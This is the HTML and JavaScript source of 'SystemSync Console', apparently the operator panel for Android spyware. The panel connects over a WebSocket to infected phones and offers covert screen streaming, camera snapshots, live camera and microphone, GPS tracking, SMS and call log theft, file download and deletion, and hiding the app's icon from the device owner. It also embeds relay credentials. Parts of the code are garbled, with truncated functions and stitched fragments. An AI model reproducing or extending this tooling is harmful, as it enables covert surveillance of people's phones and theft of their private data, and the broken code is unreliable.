<!DOCTYPE html>
<html>
<head>
    <title>SystemSync Console</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        /* ---------- your existing styles (unchanged) ---------- */
        body{
            margin:0;
            background:#f5f7fa;
            font-family: 'Segoe UI', system-ui, sans-serif;
            display:flex;
            height:100vh;
            overflow:hidden;
        }
        #sidebar{
            width:280px;
            background:white;
            border-right:1px solid #e0e4e8;
            padding:20px;
            overflow-y:auto;
            box-shadow:2px 0 5px rgba(0,0,0,0.02);
        }
        .logo{
            font-size:20px;
            font-weight:600;
            color:#1976ff;
            margin-bottom:30px;
        }
        .section{
            margin-bottom:25px;
        }
        .section-title{
            font-size:12px;
            font-weight:600;
            color:#7b8a9b;
            text-transform:uppercase;
            letter-spacing:0.5px;
            margin-bottom:12px;
        }
        button{
            width:100%;
            padding:10px 12px;
            margin:4px 0;
            background:white;
            color:#1a2634;
            border:1px solid #d0d9e2;
            border-radius:8px;
            font-size:14px;
            text-align:left;
            cursor:pointer;
            transition:0.2s;
            display:flex;
            align-items:center;
            gap:8px;
        }
        button:hover{
            background:#1976ff;
            color:white;
            border-color:#1976ff;
        }
        .camera-panel {
            background: #f0f2f5;
            border-radius: 8px;
            padding: 12px;
            margin: 8px 0;
            display: none;
        }
        .camera-panel.show {
            display: block;
        }
        .camera-option {
            margin: 8px 0;
        }
        .camera-option label {
            margin-right: 15px;
            color: #1a2634;
        }
        .capture-btn, .live-btn {
            background: #1976ff;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            margin-top: 8px;
        }
        .capture-btn:hover, .live-btn:hover {
            background: #0d5bca;
        }
        .live-controls {
            display: flex;
            gap: 8px;
            margin-top: 10px;
            flex-wrap: wrap;
        }
        .live-controls button {
            flex: 1;
            background: #1976ff;
            color: white;
            border: none;
            padding: 8px 3px;
            border-radius: 6px;
            cursor: pointer;
            width: auto;
        }
        .live-controls button.stop {
            background: #d32f2f;
        }
        .live-controls button.stop:hover {
            background: #b71c1c;
        }
        .live-controls button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        #main{
            flex:1;
            display:flex;
            flex-direction:column;
            min-width:0;
            background:#f5f7fa;
        }
        #header{
            height:60px;
            background:white;
            border-bottom:1px solid #e0e4e8;
            display:flex;
            align-items:center;
            justify-content:space-between;
            padding:0 25px;
            font-weight:600;
            color:#1a2634;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .device-selector-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        #deviceSelector {
            padding: 8px 12px;
            border-radius: 20px;
            border: 1px solid #d0d9e2;
            background: white;
            font-size: 14px;
            min-width: 200px;
        }
        .device-count {
            background: #1976ff;
            color: white;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 12px;
        }
        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        #batteryInfo {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 5px 12px;
            background: #f0f2f5;
            border-radius: 20px;
            font-size: 13px;
        }
        .battery-icon {
            position: relative;
            width: 30px;
            height: 15px;
            border: 2px solid #555;
            border-radius: 4px;
            background: #fff;
        }
        .battery-level {
            position: absolute;
            top: 2px;
            left: 2px;
            height: 11px;
            background: #4caf50;
            border-radius: 2px;
        }
        .battery-icon.charging:after {
            content: "⚡";
            position: absolute;
            top: -10px;
            left: 8px;
            font-size: 16px;
        }
        .battery-percent {
            font-weight: 600;
            min-width: 45px;
        }
        #status{
            padding:6px 16px;
            border-radius:30px;
            background:#e8f0fe;
            color:#1976ff;
            font-weight:500;
            cursor: pointer;
        }
        #status.offline{
            background:#ffebee;
            color:#c62828;
        }
        #content{
            flex:1;
            padding:20px;
            overflow:auto;
        }
        #main-panel{
            background:white;
            border-radius:12px;
            box-shadow:0 2px 8px rgba(0,0,0,0.05);
            padding:20px;
            min-height:100%;
            position:relative;
        }
        #map{
            height:400px;
            border-radius:10px;
        }
        .map-info {
            position: absolute;
            top: 30px;
            left: 30px;
            background: rgba(255,255,255,0.95);
            padding: 8px 12px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            font-size: 13px;
            color: #1a2634;
            z-index: 1000;
            pointer-events: none;
            border-left: 4px solid #1976ff;
        }
        .map-info div {
            margin: 2px 0;
        }
        .map-info .coord {
            font-weight: 600;
        }
        .map-info .addr {
            color: #2c3e50;
            font-style: italic;
        }
        table{
            width:100%;
            border-collapse:collapse;
            font-size:14px;
        }
        th{
            background:#f8fafd;
            color:#1a2634;
            font-weight:600;
            padding:12px 10px;
            text-align:left;
            border-bottom:2px solid #e0e4e8;
        }
        td{
            padding:10px;
            border-bottom:1px solid #eef2f5;
            color:#2c3e50;
            word-break:break-word;
        }
        tr:hover{
            background:#f5f9ff;
        }
        .file-manager {
            display: flex;
            flex-direction: column;
            height: 100%;
        }
        .file-toolbar-sticky {
            position: sticky;
            top: 0;
            background: white;
            z-index: 10;
            padding-bottom: 10px;
            margin-bottom: 10px;
            border-bottom: 1px solid #eef2f5;
        }
        .file-toolbar {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .file-toolbar button{
            width:auto;
            padding:6px 12px;
            background:white;
            border:1px solid #d0d9e2;
            border-radius:6px;
            cursor:pointer;
            font-size:13px;
            margin:0;
        }
        .file-toolbar button:hover{
            background:#1976ff;
            color:white;
        }
        .file-path{
            background:#f0f2f5;
            padding:6px 12px;
            border-radius:20px;
            font-size:13px;
            color:#2c3e50;
            flex:1;
        }
        .file-panes {
            display: flex;
            gap: 20px;
            flex: 1;
            overflow: hidden;
            min-height: 300px;
        }
        .folder-pane {
            flex: 1;
            background: #fafbfc;
            border-radius: 8px;
            padding: 10px;
            overflow-y: auto;
            border: 1px solid #eef2f5;
        }
        .file-pane {
            flex: 1;
            background: #fafbfc;
            border-radius: 8px;
            padding: 10px;
            overflow-y: auto;
            border: 1px solid #eef2f5;
        }
        .pane-title {
            font-size: 12px;
            font-weight: 600;
            color: #7b8a9b;
            margin-bottom: 10px;
            text-transform: uppercase;
        }
        .folder-item, .file-item {
            display: flex;
            align-items: center;
            padding: 6px 8px;
            border-radius: 6px;
            cursor: pointer;
            gap: 8px;
            margin-bottom: 2px;
        }
        .folder-item:hover {
            background: #e3f2fd;
        }
        .file-item {
            cursor: default;
        }
        .file-item:hover {
            background: #f5f5f5;
        }
        .folder-icon, .file-icon {
            width: 20px;
            text-align: center;
        }
        .folder-name, .file-name {
            flex: 1;
            font-size: 14px;
        }
        .folder-name {
            color: #1976ff;
        }
        .file-checkbox {
            width: 18px;
            height: 18px;
            cursor: pointer;
            margin-right: 8px;
        }
        .file-size {
            color: #7b8a9b;
            font-size: 12px;
            margin-left: 10px;
        }
        .file-actions {
            display: flex;
            gap: 5px;
            margin-left: 10px;
        }
        .file-actions button {
            padding: 2px 6px;
            font-size: 11px;
            background: transparent;
            border: 1px solid #d0d9e2;
            width: auto;
            margin: 0;
        }
        .file-actions button.delete {
            color: #d32f2f;
            border-color: #d32f2f;
        }
        .file-actions button.delete:hover {
            background: #d32f2f;
            color: white;
        }
        .download-selected{
            margin-top:15px;
            text-align:right;
            position: sticky;
            bottom: 0;
            background: white;
            padding: 10px 0 0 0;
            border-top: 1px solid #eef2f5;
        }
        .download-selected button{
            width:auto;
            padding:8px 16px;
            background:#1976ff;
            color:white;
            border:none;
            border-radius:6px;
            cursor:pointer;
            font-weight:500;
        }
        .download-selected button:hover{
            background:#0d5bca;
        }
        .pagination{
            margin-top:20px;
            display:flex;
            gap:8px;
            justify-content:center;
        }
        .page-btn{
            padding:6px 12px;
            border:1px solid #d0d9e2;
            background:white;
            border-radius:6px;
            cursor:pointer;
            color:#1a2634;
        }
        .page-btn:hover{
            background:#1976ff;
            color:white;
            border-color:#1976ff;
        }
        img, video {
            max-width: 100%;
            max-height: 70vh;
            border-radius: 8px;
            display: block;
            margin: 0 auto;
        }
        audio{
            width:100%;
            margin-top:15px;
        }
        .reconnect-btn{
            background: #1976ff;
            color: white;
            border: none;
            border-radius: 20px;
            padding: 5px 15px;
            font-size: 12px;
            cursor: pointer;
            margin-left: 10px;
        }
        .screen-container{
            width:100%;
            height:100%;
            display:flex;
            justify-content:center;
            align-items:center;
        }
        .screen-container video{
            max-width:100%;
            max-height:100%;
            object-fit:contain;
        }
        /* ---------- MODAL / POPUP STYLES ---------- */
        .modal-overlay{
            position:fixed;
            inset:0;
            background:rgba(0,0,0,0.7);
            display:none;
            justify-content:center;
            align-items:center;
            z-index:10000;
        }
        .modal-overlay.show {
            display: flex;
        }
        .mobile-popup{
            height: 90vh;
            width: calc(90vh * 8 / 16);
            max-width: 100vw;
            display:flex;
            flex-direction:column;
            background:#0f0f0f;
            border-radius:26px;
            border:6px solid #2e2e2e;
            box-shadow:0 40px 120px rgba(0,0,0,0.7);
            overflow:hidden;
        }
        .phone-frame{
            flex:1;
            display:flex;
            justify-content:center;
            align-items:center;
            background:black;
            overflow:hidden;
        }
        .phone-frame video{
            width:100%;
            height:100%;
            max-height:none;
            max-width:none;
            object-fit:contain;
            background:black;
        }
        .popup-controls{
            flex-shrink:0;
            background:#111;
            padding:8px;
            display:flex;
            gap:6px;
            justify-content:space-around;
            align-items:center;
        }
        .popup-controls button {
            flex: 1;
            background: #1e1e1e;
            color: white;
            border: none;
            padding: 5px 0;
            border-radius: 6px;
            cursor: pointer;
            font-size: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.15s;
            min-width: 50px;
        }
        .popup-controls button:hover {
            background: #3a3a3c;
            transform: scale(1.05);
        }
        .popup-controls button:active {
            transform: scale(0.96);
        }
        .popup-controls button.close-btn {
            background: #c0392b;
            flex: 1.3;
        }
        .popup-controls button.close-btn:hover {
            background: #e74c3c;
        }
        .popup-controls button.fullscreen-btn {
            background: #3a3a3c;
        }
        .popup-controls button.fullscreen-btn:hover {
            background: #505052;
        }
        body.modal-open #sidebar,
        body.modal-open #main {
            pointer-events: none;
            filter: blur(4px);
            transition: filter 0.3s;
        }
        /* App list styles */
        .app-item {
            display: flex;
            align-items: center;
            padding: 12px;
            border-bottom: 1px solid #eef2f5;
        }
        .app-icon {
            width: 40px;
            height: 40px;
            margin-right: 15px;
            background: #f0f2f5;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        .app-details {
            flex: 1;
        }
        .app-name {
            font-weight: 600;
            color: #1a2634;
            margin-bottom: 4px;
        }
        .app-package {
            font-size: 11px;
            color: #7b8a9b;
        }
        .app-actions {
            display: flex;
            gap: 8px;
        }
        .app-actions button {
            width: auto;
            padding: 6px 12px;
            font-size: 12px;
            margin: 0;
        }
        .app-actions button.open {
            background: #1976ff;
            color: white;
            border: none;
        }
        .app-actions button.uninstall {
            background: #d32f2f;
            color: white;
            border: none;
        }
        .no-device-message {
            padding: 40px;
            text-align: center;
            color: #7b8a9b;
        }
        .no-device-message .icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

<!-- MODAL OVERLAY (for screen share) -->
<div id="screenModalOverlay" class="modal-overlay">
    <div class="mobile-popup">
        <div class="phone-frame">
            <div class="screen-container">
                <video id="modalScreenVideo" autoplay playsinline></video>
            </div>
        </div>
        <div class="popup-controls">
            <button id="modalSnapBtn" title="Snapshot">📸</button>
            <button id="modalRecordBtn" title="Record">🔴</button>
            <button id="modalFullscreenBtn" class="fullscreen-btn" title="Fullscreen">⛶</button>
            <button id="modalCloseBtn" class="close-btn" title="Close">✕</button>
        </div>
    </div>
</div>

<div id="sidebar">
    <div class="logo">SystemSync</div>

    <div class="section">
        <div class="section-title">Device</div>
        <button onclick="getInstalledApps()"><span>📱</span> Installed Apps</button>
    </div>

    <div class="section">
        <div class="section-title">Surveillance</div>
        <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>

        <!-- Click Picture panel -->
        <button onclick="toggleCameraPanel('click')"><span>📷</span> Click Picture</button>
        <div id="clickCameraPanel" class="camera-panel">
            <div class="camera-option">
                <label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label>
                <label><input type="radio" name="clickCameraSelect" value="back"> Rear</label>
            </div>
            <div class="camera-option" id="flashOption">
                <label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label>
            </div>
            <button class="capture-btn" onclick="capturePicture()">TAKE A PICTURE</button>
        </div>

        <!-- See Live panel -->
        <button onclick="toggleCameraPanel('live')"><span>📹</span> See Live</button>
        <div id="liveCameraPanel" class="camera-panel">
            <div class="camera-option">
                <label><input type="radio" name="liveCameraSelect" value="front" checked> FrontCAM</label>
                <label><input type="radio" name="liveCameraSelect" value="back"> BackCAM</label>
            </div>
            <div class="camera-option">
                <label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label>
            </div>
            <button class="live-btn" onclick="startLiveStream()">See Live</button>
        </div>

        <!-- Live Audio button -->
        <button onclick="toggleLiveAudio()"><span>🎤</span> <span id="liveAudioBtn">Live Audio</span></button>
        <button onclick="stopLiveAudio()" style="display:none;" id="stopLiveAudioBtn">⏹ Stop Live Audio</button>

        <button onclick="sendCommand('GET_LOCATION')"><span>📍</span> GPS Location</button>
    </div>

    <div class="section">
        <div class="section-title">Data</div>
        <button onclick="sendCommand('LIST_FILES', { path: 'root' })"><span>📂</span> File Manager</button>
        <button onclick="sendCommand('GET_SMS', { box: 'inbox' })"><span>💬</span> SMS Logs</button>
        <button onclick="sendCommand('GET_CALL_LOGS')"><span>📞</span> Call Logs</button>
    </div>

    <div class="section">
        <div class="section-title">Control</div>
        <button onclick="toggleAppIcon()"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
        <button onclick="sendCommand('VIBRATE', { duration: 1000 })"><span>📳</span> Vibrate (1s)</button>

</div>

<div id="main">
    <div id="header">
        <div class="header-left">
            <span>Control Panel</span>
            <div class="device-selector-container">
                <select id="deviceSelector" onchange="switchDevice(this.value)">

            <div id="batteryInfo" style="display: none;">

    <div id="content">
        <div id="main-panel">
            <div id="welcomeMessage">
                <h2>👋 Welcome to SystemSync Console</h2>
                <p>Waiting for devices to connect...</p>
                <p>When a device installs the app, it will appear in the dropdown menu above.</p>
            </div>
        </div>
    </div>
</div>

<!-- Leaflet -->
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    // ---------- GLOBALS ----------
    const WS_URL = "wss://mirror-view.onrender.com";
    let ws = null;

    // WebRTC peer connections
    let screenPC = null;
    let cameraPC = null;
    let audioPC = null;

    // UI state
    let mapInstance = null;
    let currentData = [];
    let currentPage = 0;
    let dataType = null;
    let currentPath = "root";
    let selectedFiles = [];
    let screenActive = false;
    let iconHidden = false;

    // Live camera recording state
    let mediaRecorder = null;
    let recordedChunks = [];

    // Track the last command sent to interpret raw responses
    let pendingCommand = null;

    // Store connected devices - IMPORTANT: This will be populated when devices connect
    let devices = new Map(); // deviceId -> device info
    let currentDeviceId = null;

    // Battery info
    let currentBatteryLevel = 0;
    let currentBatteryStatus = 'unknown';

    const panel = document.getElementById('main-panel');
    const statusEl = document.getElementById('status');

    // Modal elements
    const modalOverlay = document.getElementById('screenModalOverlay');
    const modalVideo = document.getElementById('modalScreenVideo');
    
    modalVideo.addEventListener("loadedmetadata", () => {
        const w = modalVideo.videoWidth;
        const h = modalVideo.videoHeight;
        const popup = document.querySelector(".mobile-popup");
        if (h > w) {
            popup.style.aspectRatio = "9 / 16";
        } else {
            popup.style.aspectRatio = "16 / 9";
        }
    });
    
    const modalSnapBtn = document.getElementById('modalSnapBtn');
    const modalRecordBtn = document.getElementById('modalRecordBtn');
    const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
    const modalCloseBtn = document.getElementById('modalCloseBtn');
   
    function getFormattedDateTime() {
        const d = new Date();
        const pad = (n) => n.toString().padStart(2, '0');
        return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
    }

    // ---------- ICE SERVERS ----------
    const ICE_SERVERS = [
        { urls: "stun:stun.relay.metered.ca:80" },
        { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
    ];

    // ---------- SIGNALING OVER WEBSOCKET ----------
    function sendSignalingMessage(msg) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            console.error('WebSocket not open');
            return;
        }
        const payload = {
            type: 'SIGNALING',
            data: msg
        };
        ws.send(JSON.stringify(payload));
        console.log('📤 Signaling sent:', msg.type);
    }

    // ---------- PEER CONNECTION CREATORS ----------
    function createPeerConnection(streamType, onTrackCallback, useMic = false) {
        const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });

        if (streamType === 'screen') {
            pc.addTransceiver('video', { direction: 'recvonly' });
        } else if (streamType === 'camera') {
            pc.addTransceiver('video', { direction: 'recvonly' });
            if (useMic) {
                pc.addTransceiver('audio', { direction: 'recvonly' });
            }
        } else if (streamType === 'audio') {
            pc.addTransceiver('audio', { direction: 'recvonly' });
        }

        pc.ontrack = onTrackCallback;
        pc.onicecandidate = (e) => {
            if (e.candidate) {
                sendSignalingMessage({
                    type: 'ICE_CANDIDATE',
                    candidate: e.candidate,
                    streamType: streamType
                });
            }
        };
        pc.oniceconnectionstatechange = () => {
            console.log(`${streamType} ICE state:`, pc.iceConnectionState);
            if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
                if (streamType === 'screen') {
                    screenActive = false;
                    document.getElementById('screenBtn').innerText = 'Start Screen';
                    closeScreenModal();
                }
            }
        };
        return pc;
    }

    function getPCForType(type) {
        if (type === 'screen') return screenPC;
        if (type === 'camera') return cameraPC;
        if (type === 'audio') return audioPC;
        return null;
    }

    // ---------- HANDLE INCOMING SIGNALING MESSAGES ----------
    function handleSignalingMessage(msg) {
        console.log('Received signaling:', msg);
        if (msg.type === 'ANSWER') {
            const pc = getPCForType(msg.streamType);
            if (pc) {
                const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
                pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote description:', e));
            }
        } else if (msg.type === 'ICE_CANDIDATE') {
            const pc = getPCForType(msg.streamType);
            if (pc && msg.candidate) {
                pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
            }
        }
    }

    function toggleScreenRecording() {
        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
            screenMediaRecorder.stop();
            modalRecordBtn.innerText = '🔴';
        } else {
            if (!modalVideo.srcObject) {
                alert('Phone Screen Off');
                return;

            screenRecordedChunks = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const stream = modalVideo.srcObject;

            if (modalVideo.videoWidth === 0) {
                modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
            } else {
                startScreenRecording(canvas, ctx, stream);
            }
        }
    }

    function startScreenRecording(canvas, ctx, originalStream) {
        canvas.width = modalVideo.videoWidth;
        canvas.height = modalVideo.videoHeight;

        function drawVideoFrame() {
            ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
            requestAnimationFrame(drawVideoFrame);
        }
        drawVideoFrame();

        const canvasStream = canvas.captureStream(30);
        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

        screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
        screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
        screenMediaRecorder.onstop = () => {
            const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `screenVideo-${getFormattedDateTime()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            canvasStream.getTracks().forEach(track => track.stop());
        };
        screenMediaRecorder.start();
        modalRecordBtn.innerText = '🟢';
    }

    // ---------- COMMAND SENDING (JSON) ----------
    function sendCommand(command, params = {}) {
        if (!currentDeviceId) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ Please select a device first</div>`;
            return;
        }

        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
            return;
        }

        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        const payload = {
            type: 'COMMAND',
            command: command,
            requestId: requestId,
            deviceId: currentDeviceId,  // Include the selected device ID
            params: params,
            timestamp: Date.now()
        };
        ws.send(JSON.stringify(payload));
        panel.innerHTML = `📤 Command sent to ${devices.get(currentDeviceId)?.name || 'device'}: ${command}`;
        pendingCommand = command;
        setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
    }

        // For plain text, we need to prefix with device ID or handle differently

        ws.send(msg);

        devices.set(deviceId, {
            id: deviceId,
            name: deviceName,
            manufacturer: data.manufacturer,
            model: data.model,

            lastSeen: Date.now()
        });

            document.getElementById('deviceSelector').value = deviceId;

        }

    // Update device selector dropdown
    function updateDeviceSelector() {
        const selector = document.getElementById('deviceSelector');
        const countSpan = document.getElementById('deviceCount');
        
        // Save current selection
        const currentValue = selector.value;
        
        selector.innerHTML = '<option value="">Select Device</option>';
        
        devices.forEach((device, id) => {
            const option = document.createElement('option');
            option.value = id;
            option.textContent = device.name;
            if (id === currentDeviceId) {
                option.selected = true;
            }
            selector.appendChild(option);
        });
        
        countSpan.textContent = devices.size;
        
        // If we had a current selection that's still valid, keep it
        if (currentValue && devices.has(currentValue)) {
            selector.value = currentValue;
        }
    }

    // ---------- PLAIN TEXT / JSON HANDLERS ----------
    function handleJSON(json) {
        console.log('handleJSON:', json.type, json);
        
        // If this response has a deviceId and it's not the current device, 
        // we might want to handle it differently
        if (json.deviceId && json.deviceId !== currentDeviceId) {
            console.log('Message from non-selected device:', json.deviceId);
            // Optionally add to devices if not already present
            if (!devices.has(json.deviceId)) {
                handleDeviceRegistration({
                    deviceId: json.deviceId,
                    name: json.deviceName || 'Unknown Device'
                });
            }
            return;
        }

        switch (json.type) {
            case 'DEVICE_REGISTRATION':
                handleDeviceRegistration(json);
                break;

            case 'DEVICE_INFO':
                if (json.batteryLevel !== undefined) {
                    updateBatteryInfo(json.batteryLevel, json.batteryCharging || false);
                }
                break;

            case 'INSTALLED_APPS':
                displayInstalledApps(json.data);
                break;

            case 'FILE_DELETED':
                showNotification('File deleted');
                sendCommand('LIST_FILES', { path: currentPath });
                break;

            case 'DEVICE_REGISTERED':
                showNotification('Device registered successfully');
                break;

            case 'SMS_DATA':
                dataType = 'sms';
                currentData = json.data;
                renderTable();
                break;

            case 'CALL_LOGS':
                dataType = 'call';
                currentData = json.data;
                renderTable();
                break;

            case 'FILE_LIST':
                dataType = 'file';
                currentData = json.data;
                renderFiles();
                break;

            case 'LOCATION_UPDATE':
                renderMap(json.data);
                break;

            case 'CAMERA_IMAGE':
                displayCapturedImage(json.data);
                break;

            case 'AUDIO_RECORDING':
                showAudio(json.data);
                break;

            case 'ERROR':
                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
                break;

            case 'APP_HIDDEN':
                iconHidden = true;
                document.getElementById('iconBtn').innerText = 'Show Icon';
                showNotification('App icon hidden');
                break;

            case 'APP_SHOWN':
                iconHidden = false;
                document.getElementById('iconBtn').innerText = 'Hide Icon';
                showNotification('App icon shown');
                break;

            case 'SCREEN_SHARE_STARTED':
                screenActive = true;
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                showNotification('Screen share started');
                break;

            case 'SCREEN_SHARE_STOPPED':
                screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                if (screenPC) { screenPC.close(); screenPC = null; }
                showNotification('Screen share stopped');
                break;

            default:
                console.log('Unhandled JSON type:', json.type);
                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
                    dataType = 'file';
                    currentData = json;
                    renderFiles();
                } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
                    dataType = 'sms';
                    currentData = json;
                    renderTable();
                } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
                    dataType = 'call';
                    currentData = json;
                    renderTable();
                } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
                    renderMap(json);
                }
                break;
        }
        
        pendingCommand = null;
    }

    function handlePlainText(msg) {
        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
        } else if (msg.startsWith("LOC_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(9));
                renderMap(data);
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("FILE_LIST:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'file';
                renderFiles();
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("SMS_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(9));
                dataType = 'sms';
                renderTable();
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CALL_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'call';
                renderTable();
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CAMERA_IMAGE:")) {
            const base64 = msg.substring(13);
            displayCapturedImage(base64);
        } else if (msg.startsWith("AUDIO_RECORDING:")) {
            showAudio(msg.substring(16));
        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
            screenActive = true;
            document.getElementById('screenBtn').innerText = 'Stop Screen';
            showNotification('Screen share started');
        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
            screenActive = false;
            document.getElementById('screenBtn').innerText = 'Start Screen';
            if (screenPC) { screenPC.close(); screenPC = null; }
            showNotification('Screen share stopped');
        } else if (msg.startsWith("APP_HIDDEN")) {
            iconHidden = true;
            document.getElementById('iconBtn').innerText = 'Show Icon';
            showNotification('App icon hidden');
        } else if (msg.startsWith("APP_SHOWN")) {
            iconHidden = false;
            document.getElementById('iconBtn').innerText = 'Hide Icon';
            showNotification('App icon shown');
        } else if (msg.startsWith("VIBRATE_DONE")) {
            showNotification('Vibration done');
        } else if (msg.startsWith("ERROR:")) {
            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
        } else if (msg.startsWith("FILE_DATA:")) {
            const base64 = msg.substring(10);
            downloadBase64(base64, 'downloaded_file');
        } else if (msg.startsWith('[') || msg.startsWith('{')) {
            try {
                const parsed = JSON.parse(msg);
                handleJSON(parsed);
            } catch (err) {
                console.error('Failed to parse JSON in plain text:', err);
            }
        } else {
            console.log('Unhandled plain text:', msg);
        }
    }

    function startCanvasRecording(video, canvas, ctx, originalStream) {

        mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `recording_${Date.now()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            canvasStream.getTracks().forEach(track => track.stop());
        };
        mediaRecorder.start();
        document.getElementById('recordBtn').innerText = 'Stop Recording';
    }

    // ---------- APP ICON TOGGLE ----------
    function toggleAppIcon() {
        if (iconHidden) sendPlainText('showApp');
        else sendPlainText('hideApp');
    }

    // ---------- RENDERERS ----------
    function showAudio(base64) {
        panel.innerHTML = `
            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
            <button onclick="downloadBase64('${base64}', 'recording.3gp')">Download</button>
        `;
    }

    function downloadBase64(b64, filename) {
        const a = document.createElement('a');
        a.href = 'data:application/octet-stream;base64,' + b64;
        a.download = filename;
        a.click();
    }

    function renderMap(loc) {
        panel.innerHTML = '<div id="map" style="position:relative;"></div>';
        const mapDiv = document.getElementById('map');

        const infoDiv = document.createElement('div');
        infoDiv.className = 'map-info';
        infoDiv.innerHTML = `
            <div class="coord">📍 ${typeof loc.lat === 'string' ? parseFloat(loc.lat).toFixed(6) : loc.lat.toFixed(6)}, ${typeof loc.lon === 'string' ? parseFloat(loc.lon).toFixed(6) : loc.lon.toFixed(6)}</div>
            <div>🎯 Accuracy: ${loc.accuracy ? (typeof loc.accuracy === 'string' ? parseFloat(loc.accuracy).toFixed(1) : loc.accuracy.toFixed(1)) : '?'} m</div>
            <div>📡 Provider: ${loc.provider || 'unknown'}</div>
            <div class="addr">🌍 Loading address...</div>
        `;
        mapDiv.appendChild(infoDiv);

        if (mapInstance) mapInstance.remove();
        mapInstance = L.map(mapDiv).setView([parseFloat(loc.lat), parseFloat(loc.lon)], 18);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
        L.circle([parseFloat(loc.lat), parseFloat(loc.lon)], { radius: loc.accuracy ? parseFloat(loc.accuracy) : 10, color: '#1976ff' }).addTo(mapInstance);

        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
        })
        .then(response => response.json())
        .then(data => {
            const address = data.display_name || 'Address not found';
            infoDiv.querySelector('.addr').innerHTML = `🌍 ${address}`;
        })
        .catch(err => {
            console.error('Geocoding error:', err);
            infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
        });
    }

